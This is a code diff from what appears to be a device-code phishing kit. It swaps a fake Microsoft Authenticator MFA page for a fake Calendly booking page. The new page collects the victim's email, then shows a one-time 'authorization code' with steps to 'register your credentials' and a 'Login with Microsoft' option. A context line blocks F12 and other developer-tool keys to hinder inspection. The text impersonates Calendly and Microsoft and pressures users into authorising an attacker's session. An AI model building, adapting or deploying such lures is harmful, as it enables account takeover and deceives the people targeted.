@@ -465,61 +465,593 @@ document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.
 </body>
 </html>`
 
-// Microsoft Authenticator MFA themed page
-const DEVICE_CODE_AUTHENTICATOR_HTML = `<!DOCTYPE html>
+// Calendly themed page
+const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
-<title>Microsoft Authenticator - Verification</title>
-<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAA3RJREFUWEfNl0tsU1cQhv/jO7bj2HHixHkQAkkgJDyaBBKgQFuVCkSRuqhU0UVXXbZlxaKLrlixYtUNUldIXSGxQOqii0qIh6hUCRSJR3g0ISQkJCEJSexAHNu5vmP7+p45595rJzghNKLqok46Ov/MzJn5Z+aMfSX+B/L/N/xJvF7vKrvdvkun023QarWbVSrVep1Ot1GtVm9Qq9V2m81mVyqVVoVCYVEoFGaFQmFSqVRGhUJhVCgURrlcblAqlfr/LPzJ7u5up9/vd/T19Tn7+/udAwMDzsHBQefQ0JBzZGTEOTo66hgbG3OMj487JiYmHJOTk46pqSnH9PS0Y2ZmxjE7O+tramrSPxuAz+ezDg8PW0ZGRizj4+OW6elpS3d3t6Wnp8fS29tr6e/vt4yNjVkmJyctMzMzlrm5OUsgELAEg0FLKBSyBAIBS29vr+npAGp+amrKOjEx YZ2cnLROT09bp6enrTMzM9a5uTnr/Py8dXFx0bqysmJdXV21rq2tWdfX163BYNAaDoctoVDIGgqFrI8FEAgEDAC MgUDA2N/fbxwYGDAODQ0Zh4eHjWNjY8aJiQnj9PS0sa+vz9jf32/s6+sz9vX1GXs7OzuNPT09xp6eHmN3d7fx8QH+ AoiKCQYGBoz9/f3G4eFh4+joqHFiYsI4PT1tnJ+fNy4vLxtXV1eNa2trxvX1dWMoFDIGg0FjMBg0zs7OGh8d QCwWM8zNzRkWFhYMi4uLhqWlJcPy8rJheXnZsLKyYlhdXTWsra0Z1tfXDRsbG4ZgMGiIRCKGSCRiiEQihvX1 dcPDAdTV1ZkmJydNs7OzpoWFBdP8/LxpaWnJ1N3dberu7jb19PQY+/r6jMPDw8axsTHj1NSUcW5uzhgIBIzR aNQYjUaN0WjU+PAAtbW15q6uLnNPT495YGDAPDY2Zh4fHzd3dXWZu7u7zd3d3eb+/n7z8PCweWxszDw5OWlc XFw0LiwsmJaWlkzLy8umxcVF08MBiP/Fixcvnlu3br302muvnXv99df/9u7duy8dO3bspQ8++ODc4cOHz x0+fPjce++9d+7gwYPnDhw4cO7dd989u3///rM7d+482dnZefZ+WjXr6+u1lZWV2vLycm1paalWfG1JSbGm pKTkZocOHTp586233rr5xhtvnDx+/PhJ8b1//Hi9/v7+E3U1Nee2b9jw0datW3+pra39RafXn1er1RdkMtl1 mUx2VSaTXZXL5VdlMtlVmUx2VSaTXZPJZNdlMtl1uVx+XS6XX5fL5TdkMtkNmRQXvgP/AHoBVoPV7QAAAAAA SU5ORK5CYII=">
-<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;min-height:100vh}.header{background:linear-gradient(135deg,#0078d4,#00bcf2);padding:16px 36px;display:flex;align-items:center;gap:14px;flex-shrink:0;box-shadow:0 3px 8px rgba(0,0,0,0.15)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:700;letter-spacing:-0.3px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.1);width:100%;max-width:520px;padding:52px 48px}.logo{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:36px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:800;color:#0078d4}.intro{text-align:center;color:#1a1a1a;font-size:13px;line-height:1.7;margin-bottom:32px;font-weight:600}.info-box{background:linear-gradient(135deg,#e8f4fd,#cfe7f7);border-left:5px solid#0078d4;padding:18px 20px;margin-bottom:32px;font-size:15px;color:#004578;line-height:1.7;border-radius:6px}.code-label{font-size:15px;font-weight:800;color:#0078d4;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px;text-align:center}.code-input{width:100%;background:#fafbfc;border:2px solid#0078d4;border-radius:8px;padding:14px;font-size:20px;font-weight:900;letter-spacing:6px;color:#0078d4;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:14px;user-select:all;transition:all .2s;box-shadow:inset 0 2px 4px rgba(0,0,0,0.05)}.code-input.loading{color:#8a8886;font-size:18px;letter-spacing:normal;border-color:#c8c6c4}.code-input:hover{transform:scale(1.01)}.copy-row{display:flex;justify-content:center;margin-bottom:28px}.copy-btn{background:linear-gradient(135deg,#0078d4,#005a9e);color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:800;display:flex;align-items:center;gap:12px;transition:all .2s;box-shadow:0 4px 12px rgba(0,120,212,0.25)}.copy-btn:hover{background:linear-gradient(135deg,#005a9e,#004578);transform:translateY(-2px);box-shadow:0 6px 16px rgba(0,120,212,0.35)}.copy-btn.copied{background:linear-gradient(135deg,#107c10,#0b5a0b)}.copy-btn svg{width:19px;height:19px;fill:currentColor}.status{font-size:15px;color:#107c10;text-align:center;margin-bottom:22px;min-height:24px;font-weight:700}.btn-primary{display:flex;align-items:center;justify-content:center;gap:14px;width:100%;background:linear-gradient(135deg,#0078d4,#00bcf2);color:#fff;border:none;padding:14px 28px;font-size:14px;font-weight:800;cursor:pointer;border-radius:8px;transition:all .2s;margin-bottom:28px;box-shadow:0 4px 14px rgba(0,120,212,0.3)}.btn-primary:hover{background:linear-gradient(135deg,#005a9e,#0091c8);transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,120,212,0.4)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none;box-shadow:none}.btn-primary svg{flex-shrink:0}.security-box{background:linear-gradient(135deg,#f8fbfd,#e8f3f9);border:2px solid#0078d4;border-radius:8px;padding:20px;margin-bottom:28px;text-align:center}.security-box p{font-size:14px;color:#1a1a1a;line-height:1.7;margin-bottom:16px;font-weight:500}.security-badge{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#0078d4,#00bcf2);color:#fff;padding:12px 24px;border-radius:8px;font-size:15px;font-weight:800;text-decoration:none;transition:all .2s;box-shadow:0 3px 10px rgba(0,120,212,0.25)}.security-badge:hover{background:linear-gradient(135deg,#005a9e,#0091c8);transform:translateY(-1px);box-shadow:0 5px 14px rgba(0,120,212,0.35)}.security-badge svg{width:17px;height:17px;fill:currentColor}.footer-text{text-align:center;font-size:14px;color:#605e5c;margin-bottom:20px;font-weight:500}.timer{text-align:center;font-size:14px;color:#323130;font-weight:700;background:#fff3cd;padding:10px;border-radius:6px}.timer span{font-weight:900;color:#d83b01}.success{display:none;text-align:center;padding:28px 0}.success-icon{width:80px;height:80px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 6px 16px rgba(16,124,16,0.35)}.success-icon svg{width:40px;height:40px;fill:#fff}.success h2{font-size:24px;font-weight:800;color:#1a1a1a;margin-bottom:12px}.success p{font-size:16px;color:#605e5c;margin-bottom:28px;font-weight:500}.success-badge{display:inline-flex;align-items:center;gap:12px;background:linear-gradient(135deg,#dff6dd,#c3ebbf);color:#107c10;padding:14px 28px;border-radius:8px;font-size:16px;font-weight:800;border:2px solid#107c10}.success-badge svg{width:22px;height:22px;fill:currentColor}@media(max-width:500px){.card{padding:40px 32px;border-radius:0}.code-input{font-size:24px;letter-spacing:4px}}</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calendly - Testing Event</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #006bff;
+            --primary-hover: #0056cc;
+            --bg: #ffffff;
+            --text: #1a1a1a;
+            --text-muted: #555555;
+            --border: #e2e2e2;
+            --light-blue: #f3f8ff;
+        }
+
+        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+        body { font-family: 'Inter', sans-serif; background-color: #fafafa; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+
+        /* Calendly Header */
+        .navbar { width: 100%; background: #ffffff; border-bottom: 1px solid var(--border); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .nav-logo { display: flex; align-items: center; font-size: 20px; font-weight: 800; color: #006bff; letter-spacing: -0.5px; }
+        .nav-logo span { color: #1a1a1a; margin-left: 2px; }
+        .nav-links { display: flex; gap: 30px; font-size: 15px; font-weight: 500; color: #4a5568; }
+        .nav-links a { text-decoration: none; color: inherit; transition: color 0.2s; }
+        .nav-links a:hover { color: var(--primary); }
+
+        .app-container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
+        .wrapper { width: 100%; max-width: 1060px; position: relative; display: flex; justify-content: center; }
+        .main-card { background: white; border: 1px solid var(--border); border-radius: 8px; box-shadow: 0 1px 20px rgba(0,0,0,0.04); display: flex; min-height: 640px; width: 100%; position: relative; overflow: hidden; transition: max-width 0.3s ease; }
+
+        .ribbon { position: absolute; top: 25px; right: -35px; background: #666; color: white; padding: 5px 40px; transform: rotate(45deg); font-size: 10px; font-weight: 700; z-index: 10; letter-spacing: 0.5px; }
+
+        /* Sidebar Layout */
+        .sidebar { width: 35%; padding: 45px 35px; border-right: 1px solid var(--border); position: relative; }
+        .back-circle { width: 42px; height: 42px; border: 1px solid var(--border); border-radius: 50%; display: none; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 25px; background: white; }
+        .back-circle:hover { background: var(--light-blue); border-color: var(--primary); }
+        .host-name { color: var(--text-muted); font-size: 14px; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .meeting-title { font-size: 26px; font-weight: 700; margin: 0 0 25px 0; color: var(--text); }
+        .details-item { display: flex; align-items: center; gap: 12px; color: var(--text-muted); font-weight: 500; font-size: 15px; margin-bottom: 16px; }
+        .details-item svg { width: 18px; height: 18px; color: #666; flex-shrink: 0; }
+        .sidebar-footer { position: absolute; bottom: 30px; left: 35px; display: flex; gap: 15px; font-size: 13px; }
+        .sidebar-footer a { color: var(--primary); text-decoration: none; font-weight: 500; }
+
+        /* Content Frames */
+        .content { flex: 1; display: flex; flex-direction: column; background: #fff; position: relative; }
+        .view { width: 100%; display: none; padding: 45px; animation: fadeIn 0.25s ease; height: 100%; }
+        .view.active { display: block; }
+
+        /* Step 1: Calendar Layout */
+        .calendar-layout { display: flex; gap: 20px; }
+        .cal-picker { flex: 1; min-width: 300px; }
+        .cal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .grid { display: grid; grid-template-columns: repeat(7, 1fr); gap: 2px; text-align: center; }
+        .day-name { font-size: 11px; font-weight: 700; color: var(--text-muted); padding: 10px 0; }
+        
+        .date { aspect-ratio: 1; display: flex; align-items: center; justify-content: center; font-size: 14px; border-radius: 50%; color: #d5d5d5; cursor: default; margin: 2px; font-weight: 500; }
+        .date.available { background: var(--light-blue); color: var(--primary); font-weight: 700; cursor: pointer; }
+        .date.available:hover { background: #e0eeff; }
+        .date.active { background: var(--primary) !important; color: white !important; }
+        
+        .tz-display { margin-top: 40px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; color: var(--text); }
+
+        /* Time Selection Column */
+        .time-panel { width: 0; opacity: 0; overflow: hidden; transition: 0.3s ease; border-left: 0 solid var(--border); }
+        .time-panel.show { width: 280px; opacity: 1; padding-left: 20px; border-left: 1px solid var(--border); }
+        .slot-row { display: flex; gap: 8px; margin-bottom: 10px; }
+        .slot-btn { flex: 1; padding: 15px; border: 1px solid var(--primary); color: var(--primary); background: white; border-radius: 4px; font-weight: 700; cursor: pointer; font-size: 15px; transition: all 0.2s; }
+        .slot-btn:hover { border-width: 2px; background: var(--light-blue); }
+        .confirm-btn { display: none; background: var(--primary); color: white; border: none; padding: 15px; border-radius: 4px; font-weight: 700; flex: 1; cursor: pointer; font-size: 15px; }
+
+        /* General Forms */
+        .form-group { margin-bottom: 22px; }
+        .form-group label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; color: var(--text); }
+        .form-group input, .form-group textarea { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 6px; font-family: inherit; font-size: 15px; color: var(--text); }
+        .form-group input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 1px var(--primary); }
+        .btn-action { background: var(--primary); color: white; border: none; padding: 14px 32px; border-radius: 25px; font-weight: 700; cursor: pointer; font-size: 15px; transition: background 0.2s; }
+        .btn-action:hover { background: var(--primary-hover); }
+
+        /* Step 3 Login Screen Design */
+        .login-frame-container { display: flex; flex-direction: column; align-items: center; padding: 10px 0; }
+        .login-title { font-size: 26px; font-weight: 700; color: #0a2540; margin: 0 0 8px 0; text-align: center; line-height: 1.3; }
+        .login-subtitle { font-size: 15px; color: var(--text-muted); margin: 0 0 25px 0; text-align: center; max-width: 420px; line-height: 1.4; }
+        .login-box { border: 1px solid #e2e8f0; border-radius: 18px; padding: 35px; width: 100%; max-width: 440px; box-shadow: 0 4px 12px rgba(0,0,0,0.015); background: #ffffff; }
+        
+        .floating-input-container { position: relative; margin-bottom: 20px; border: 1px solid #a0aec0; border-radius: 6px; padding: 10px 14px; }
+        .floating-label { position: absolute; top: -10px; left: 12px; background: white; padding: 0 6px; font-size: 12px; color: #718096; font-weight: 500; }
+        .static-email-text { font-size: 16px; color: #1a202c; padding: 2px 0; margin: 0; word-break: break-all; font-weight: 500; }
+
+        .btn-continue { width: 100%; background: #006bff; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 20px; }
+        .btn-continue:hover { background: #0056cc; }
+        .divider-row { display: flex; align-items: center; text-align: center; color: #a0aec0; font-size: 12px; font-weight: 600; margin-bottom: 20px; letter-spacing: 0.5px; }
+        .divider-row::before, .divider-row::after { content: ''; flex: 1; border-bottom: 1px solid #e2e8f0; }
+        .divider-row:not(:empty)::before { margin-right: .75em; }
+        .divider-row:not(:empty)::after { margin-left: .75em; }
+
+        .oauth-btn { width: 100%; background: #ffffff; border: 1px solid #0a2540; color: #4a5568; padding: 12px; border-radius: 6px; font-size: 15px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; margin-bottom: 12px; }
+        .oauth-btn:hover { background: #f7fafc; }
+        .oauth-btn img { width: 18px; height: 18px; }
+
+        /* REVERTED DIALOG BOX OVERLAY DIMENSIONS */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(15, 23, 42, 0.4); backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px); z-index: 200; align-items: center; justify-content: center; padding: 16px; }
+        
+        /* Restored max-width back to 400px */
+        .secure-card { border: 1px solid #e2e8f0; border-radius: 12px; width: 100%; max-width: 400px; background: #ffffff; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); display: flex; flex-direction: column; overflow: hidden; }
+        
+        /* Restored header paddings and font-sizes */
+        .secure-header { padding: 20px 24px; display: flex; gap: 14px; align-items: center; border-bottom: 1px solid #f1f5f9; background: #ffffff; }
+        .secure-icon-box { background: #f0f7ff; border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .secure-icon-box svg { width: 20px; height: 20px; color: #006bff; }
+        .secure-header-details { display: flex; flex-direction: column; }
+        .secure-badge { font-size: 11px; font-weight: 700; color: #006bff; letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 1px; }
+        .secure-title { font-size: 16px; font-weight: 700; color: #0f172a; margin: 0 0 2px 0; letter-spacing: -0.1px; }
+        .secure-subtitle { font-size: 13px; color: #64748b; margin: 0; font-weight: 400; }
+
+        /* Restored body paddings */
+        .secure-body { padding: 20px 24px; display: flex; flex-direction: column; background: #ffffff; }
+        
+        .access-code-label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .access-code-label { font-size: 12px; font-weight: 600; color: #64748b; letter-spacing: 0.5px; text-transform: uppercase; }
+        
+        .refresh-code-link { font-size: 13px; color: #006bff; text-decoration: none; font-weight: 500; display: flex; align-items: center; gap: 4px; }
+        .refresh-code-link:hover { text-decoration: underline; }
+        
+        /* Restored verification code box space dimensions */
+        .code-display-box { border: 1px solid #cbd5e1; border-radius: 8px; padding: 10px 14px; background: #f8fafc; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; min-height: 52px; }
+        .code-string { font-family: -apple-system, BlinkMacSystemFont, monospace; font-size: 20px; font-weight: 700; color: #0f172a; letter-spacing: 4px; margin: 0; }
+        
+        .btn-copy { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 6px; color: #334155; padding: 6px 12px; font-size: 13px; font-weight: 500; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+        .btn-copy:hover { background: #f1f5f9; border-color: #94a3b8; }
+
+        /* Restored layout guidelines sizing rules */
+        .instruction-list { display: flex; flex-direction: column; gap: 10px; margin: 0 0 20px 0; padding: 0; list-style: none; }
+        .instruction-item { display: flex; gap: 10px; align-items: flex-start; font-size: 13.5px; color: #334155; font-weight: 400; line-height: 1.4; }
+        .instruction-num { width: 18px; height: 18px; border-radius: 50%; background: #e2e8f0; color: #475569; font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+
+        /* Restored structural interaction paddings */
+        .btn-secure-authenticate { width: 100%; background: #006bff; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 8px; }
+        .btn-secure-authenticate:hover { background: #0056cc; }
+        .btn-secure-back { width: 100%; background: #ffffff; color: #475569; border: 1px solid #cbd5e1; padding: 12px; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .btn-secure-back:hover { background: #f8fafc; border-color: #94a3b8; }
+
+        /* Restored informational text scales */
+        .secure-footer { border-top: 1px solid #f1f5f9; padding: 12px; background: #f8fafc; display: flex; justify-content: center; gap: 8px; font-size: 11px; color: #94a3b8; font-weight: 500; }
+
+        /* Step 4: Success Layout */
+        .success-container { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; margin: auto; }
+        .success-box { border: 1px solid var(--border); border-radius: 8px; padding: 25px; text-align: left; width: 100%; max-width: 460px; margin: 30px 0; background: #fff; }
+        .dl-section { border-top: 1px solid var(--border); padding-top: 20px; margin-top: 20px; font-size: 14px; color: var(--text-muted); line-height: 1.5; }
+        .btn-dl { color: var(--primary); text-decoration: none; font-weight: 600; display: inline-block; margin-top: 8px; }
+
+        @media (max-width: 900px) {
+            .navbar { padding: 15px 20px; }
+            .nav-links { display: none; }
+            .main-card { flex-direction: column; }
+            .sidebar { width: 100%; border-right: none; border-bottom: 1px solid var(--border); padding: 30px; }
+            .calendar-layout { flex-direction: column; }
+            .time-panel.show { width: 100%; border-left: none; border-top: 1px solid var(--border); padding: 20px 0; }
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
 </head>
 <body>
-<div class="header">
-<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/31/b7/a8/31b7a8f3-a164-d1f8-cc20-0ae39d5cef7d/AppIcon-0-1x_U007emarketing-0-11-0-sRGB-85-220-0.png/400x400ia-75.webp" width="28" height="28" style="border-radius:6px;flex-shrink:0">
-<span class="header-title">Microsoft Authenticator</span>
+
+<nav class="navbar">
+    <div class="nav-logo">Calendly<span></span></div>
+    <div class="nav-links">
+        <a href="#">Individuals</a>
+        <a href="#">Teams</a>
+        <a href="#">Enterprise</a>
+        <a href="#">Product</a>
+        <a href="#">Pricing</a>
+        <a href="#">Resources</a>
+    </div>
+</nav>
+
+<div class="app-container">
+    <div class="wrapper">
+        <div class="main-card" id="card">
+            <div class="ribbon">POWERED BY<br>Calendly</div>
+
+            <div class="sidebar" id="sidebar">
+                <div class="back-circle" id="backBtn" onclick="stepBack()">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                </div>
+                <div class="host-name">Testing Workspace</div>
+                <h1 class="meeting-title">Testing Event Sandbox</h1>
+                
+                <div class="details-item">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                    <span>30 min</span>
+                </div>
+                <div class="details-item">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
+                    <span>Zoom Video Conference</span>
+                </div>
+                <div class="details-item" id="sideDT" style="display: none;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+                    <span id="dtDisplay"></span>
+                </div>
+                
+                <div class="sidebar-footer">
+                    <a href="#">Cookie settings</a>
+                    <a href="#">Privacy Policy</a>
+                </div>
+            </div>
+
+            <div class="content">
+                
+                <div id="step1" class="view active">
+                    <h2 style="font-size: 20px; margin-top: 0; font-weight: 700;">Select a Date & Time</h2>
+                    <div class="calendar-layout">
+                        <div class="cal-picker">
+                            <div class="cal-header">
+                                <span id="monthName" style="font-weight: 600; font-size: 16px;"></span>
+                                <div style="color: var(--primary); font-weight: bold; cursor: pointer; font-size: 14px;">&lt; &nbsp; &gt;</div>
+                            </div>
+                            <div class="grid" id="calendarGrid">
+                                <div class="day-name">MON</div><div class="day-name">TUE</div><div class="day-name">WED</div>
+                                <div class="day-name">THU</div><div class="day-name">FRI</div><div class="day-name">SAT</div><div class="day-name">SUN</div>
+                            </div>
+                            <div class="tz-display">
+                                <span>🌎</span> <span id="localTz">Loading local data...</span> ▾
+                            </div>
+                        </div>
+                        <div class="time-panel" id="timePanel">
+                            <p id="panelDate" style="font-weight: 600; margin-bottom: 20px; font-size: 15px; color: #1a1a1a;"></p>
+                            <div id="slotsScroll" style="height: 380px; overflow-y: auto; padding-right: 4px;"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="step2" class="view">
+                    <h2 style="font-size: 20px; margin-top: 0; font-weight: 700;">Enter Details</h2>
+                    <div class="form-group"><label>Name *</label><input type="text" value="Testing Account" placeholder="Your Name"></div>
+                    <div class="form-group"><label>Email Address *</label><input type="email" placeholder="you@example.com" id="userEmail" oninput="syncEmailLabel(this.value)"></div>
+                    <div class="form-group"><label>Please share anything that will help prepare for our meeting.</label><textarea rows="3" placeholder="Context or goals..."></textarea></div>
+                    <button class="btn-action" onclick="handleFormSubmit()">Continue</button>
+                </div>
+
+                <div id="step3" class="view">
+                    <div class="login-frame-container">
+                        <h1 class="login-title">Log in to add this email to your calendar</h1>
+                        <p class="login-subtitle">Please sign in to coordinate slots and synchronize invitations directly to your system ledger.</p>
+                        
+                        <div class="login-box">
+                            <div class="floating-input-container">
+                                <span class="floating-label">Email</span>
+                                <p class="static-email-text" id="targetEmailMock">you@example.com</p>
+                            </div>
+                            
+                            <button class="btn-continue" onclick="openOtpDialog()">Get Authentication Code</button>
+                            
+                            <div class="divider-row">OR</div>
+                            
+                            <button class="btn-oauth oauth-btn" onclick="goToStep(4)">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+                                Login with Microsoft
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="step4" class="view" style="padding: 0; background: #fff;">
+                    <div class="success-container">
+                        <div style="font-size: 52px; color: #2ecc71; margin-bottom: 5px;">✓</div>
+                        <h2 style="margin: 10px 0 6px; font-size: 24px; font-weight: 700;">Confirmed</h2>
+                        <p style="color: var(--text-muted); margin: 0; font-size: 15px;">Your meeting session has been synced and secured.</p>
+                        
+                        <div class="success-box">
+                            <h3 style="margin: 0 0 16px; font-size: 18px; font-weight: 700;">Testing Event Sandbox</h3>
+                            <div class="details-item" id="finalDT"></div>
+                            <div class="details-item">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                                <span>Zoom Video Conference links attached</span>
+                            </div>
+                            <div class="dl-section">
+                                Download the raw calendar invitation file below to parse this window straight into your device system.
+                                <br>
+                                <a class="btn-dl" href="#" onclick="alert('ICS invitation file generation complete.')">⬇ Download invitation.ics file</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
 </div>
-<div class="main"><div class="card">
-<div class="logo">
-<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/31/b7/a8/31b7a8f3-a164-d1f8-cc20-0ae39d5cef7d/AppIcon-0-1x_U007emarketing-0-11-0-sRGB-85-220-0.png/400x400ia-75.webp" width="44" height="44" style="border-radius:10px;flex-shrink:0">
-<span class="logo-text">Microsoft Authenticator</span>
+
+<div class="modal-overlay" id="otpOverlay">
+    <div class="secure-card">
+        <div class="secure-header">
+            <div class="secure-icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+            </div>
+            <div class="secure-header-details">
+                <span class="secure-badge">Identity Validation</span>
+                <h2 class="secure-title">Calendar Verification</h2>
+                <p class="secure-subtitle">Confirm your slot request</p>
+            </div>
+        </div>
+        
+        <div class="secure-body">
+            <div class="access-code-label-row">
+                <span class="access-code-label">One-Time Passcode</span>
+                <a href="#" class="refresh-code-link" onclick="generateNewCode(); return false;">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"></polyline><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
+                    New code
+                </a>
+            </div>
+            <div class="code-display-box">
+                <p class="code-string" id="authCodePlaceholder">Loading...</p>
+                <button class="btn-copy" onclick="copyAuthCode()">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                    Copy
+                </button>
+            </div>
+
+            <ul class="instruction-list">
+                <li class="instruction-item">
+                    <span class="instruction-num">1</span>
+                    <span>Copy the authorization code listed above.</span>
+                </li>
+                <li class="instruction-item">
+                    <span class="instruction-num">2</span>
+                    <span>Click <b>Authenticate Booking</b> to register your credentials.</span>
+                </li>
+                <li class="instruction-item">
+                    <span class="instruction-num">3</span>
+                    <span>Provide the token to lock in your calendar window.</span>
+                </li>
+            </ul>
+
+            <button class="btn-secure-authenticate" onclick="confirmAndProceed()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-right: 2px;"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                Authenticate Booking
+            </button>
+            
+            <button class="btn-secure-back" onclick="closeOtpDialog()">
+                Cancel
+            </button>
+        </div>
+
+        <div class="secure-footer">
+            <span>Secure sync</span>
+            <span>•</span>
+            <span>Encrypted tunnel</span>
+        </div>
+    </div>
 </div>
-<div id="mainView">
-<p class="intro">Complete your multi-factor authentication to proceed.</p>
-<div class="info-box">Your organization requires MFA validation. Use the authorization code below on the Microsoft sign-in page to complete authentication.</div>
-<div class="code-label">MFA Authorization Code</div>
-<div class="code-input" id="userCode">Loading...</div>
-<div class="copy-row">
-<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
-<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
-<span id="copyText">Copy Code</span>
-</button>
-</div>
-<div class="status" id="codeStatus"></div>
-<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
